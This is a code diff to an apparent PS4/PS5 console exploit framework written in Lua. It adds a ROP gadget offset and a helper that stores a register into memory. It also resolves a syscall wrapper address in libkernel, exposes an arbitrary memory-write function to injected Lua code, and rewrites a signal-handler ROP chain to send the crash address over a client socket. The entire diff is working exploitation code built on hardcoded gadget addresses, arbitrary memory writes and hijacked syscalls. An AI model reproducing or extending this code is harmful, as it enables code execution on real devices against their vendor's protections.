@@ -90,6 +90,7 @@ gadget_table = {
             ["pop r8; ret"] = 0x9f1,
             ["mov r9, rbx; call [rax + 8]"] = 0x1511ff,
             ["mov esp, 0xfb0000bd; ret"] = 0x3bca94,
+            ["mov [rax + 8], rcx; ret"] = 0x13c4fa,
 
             ["mov [rdi], rsi; ret"] = 0xd76ff,
             ["mov [rdi], rax; ret"] = 0x994cb,
@@ -1550,6 +1551,11 @@ function ropchain:push_store_rax_into_memory(addr)
     self:push(gadgets["mov [rdi], rax; ret"])
 end
 
+function ropchain:push_store_rcx_into_memory(addr) -- clobbers rax
+    self:push_set_rax(addr - 0x8)
+    self:push(gadgets["mov [rax + 8], rcx; ret"])
+end
+
 function ropchain:push_add_dword_memory_with_eax(addr)
     self:push_set_rbx(addr)
     self:push(gadgets["add [rbx], eax; ret"])
@@ -1904,6 +1910,7 @@ function syscall.init()
     elseif PLATFORM == "ps5" then -- can be any syscall wrapper in libkernel
         local gettimeofday = memory.read_qword(libc_addrofs.gettimeofday_import)
         syscall_rop.syscall_address = gettimeofday + 7  -- +7 is to skip "mov rax, <num>" instruction
+        WRITE_ADDR = syscall_rop.syscall_address
     else
         errorf("invalid platform %s", PLATFORM)
     end
@@ -1947,6 +1954,9 @@ function run_lua_code(lua_code)
         end,
         printf = function(fmt, ...)
             table.insert(output, string.format(fmt, ...))
+        end,
+        write_qword = function(...)
+            memory.write_qword(...)
         end
     }
 
@@ -2160,22 +2170,19 @@ end
 
 function signal_handler_rop(client_fd)
     local start_addr = 0xfb0000bd
-    output = "Test from exception handler"
+    output = string.rep("\0", 0x8)
     
-    local chain = ropchain(0x500, 0x100, 0xfb0000bd - 0x8)
+    -- TODO: restore execution correctly instead of crash
+    local chain = ropchain(0x500, 0x100, start_addr - 0x8)
     
     chain:push_set_rdi(ropchain.resolve_value(client_fd))
-    chain:push_set_rsi(lua.addrof(output)+24)
+    chain:push_set_rsi(ropchain.resolve_value(output))
     chain:push_set_rdx(ropchain.resolve_value(#output))
-    chain:push_set_rcx(0)
+    chain:push_store_rcx_into_memory(ropchain.resolve_value(output)) -- rcx contains sigsegv address
     chain:push_set_r8(0)
     chain:push_set_r9(0)
-    chain:push_set_rax(4) -- syscall_num
+    chain:push_set_rax(4) -- syscall_num=write
     chain:push_fcall_raw(WRITE_ADDR)
-    chain:push_store_retval()
-    
-    -- memory.write_qword(start_addr, gadgets["pop rsp; ret"])
-    -- memory.write_qword(start_addr + 0x8, chain.stack_base + 0x8)
 end
 
 function main()
